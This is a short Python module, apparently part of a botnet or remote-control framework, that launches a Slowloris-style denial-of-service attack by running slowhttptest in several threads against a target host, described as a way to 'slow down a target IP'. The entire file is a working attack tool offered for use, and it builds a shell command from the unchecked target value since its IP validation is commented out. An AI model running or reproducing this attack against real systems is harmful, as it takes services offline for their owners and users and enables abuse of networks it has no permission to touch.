#!/usr/bin/python


# standard libarary
import os
import sys
import json
import socket
if sys.version_info[0] > 2:
    from queue import Queue
else:
    from Queue import Queue
import subprocess

# utilities
import util

# globals
packages = []
platforms = ['linux2','darwin']
threads = {}
targets = []
tasks = Queue()
usage = 'ddos [target]'
desciription = """
Slow down a target IP
"""


# def _ping(host):
#     global results
#     try:
#         if host not in results:
#             if subprocess.call("ping -{} 1 -W 90 {}".format('n' if os.name == 'nt' else 'c', host), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
#                 results[host] = {}
#                 return True
#             else:
#                 return False
#         else:
#             return True
#     except Exception as e:
#         util.log(str(e))
#         return False

def _slow(host):
    try:      
        if subprocess.call(f"slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://{host} -x 24 -p 3", 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
            return True
        else:
            return False
    except Exception as e:
        util.log("{} error: {}".format(_slow.__name__, str(e)))
        return False

@util.threaded
def _threader():
    while True:
        global tasks
        try:
            method, task = tasks.get_nowait()
            if callable(method):
                _ = method(task)
            tasks.task_done()
        except:
            break

def run(target='192.168.1.1'):
   
    global tasks
    global threads

    # if not util.ipv4(target): raise ValueError("target is not a valid IPv4 address")
   
    for i in range(4): #cate core-uri are masina
        tasks.put_nowait((_slow, target))
    for i in range(1, tasks.qsize()):
        threads['ddos-%d' % i] = _threader()
    for t in threads:
        threads[t].join()
    return "slowloris finised"

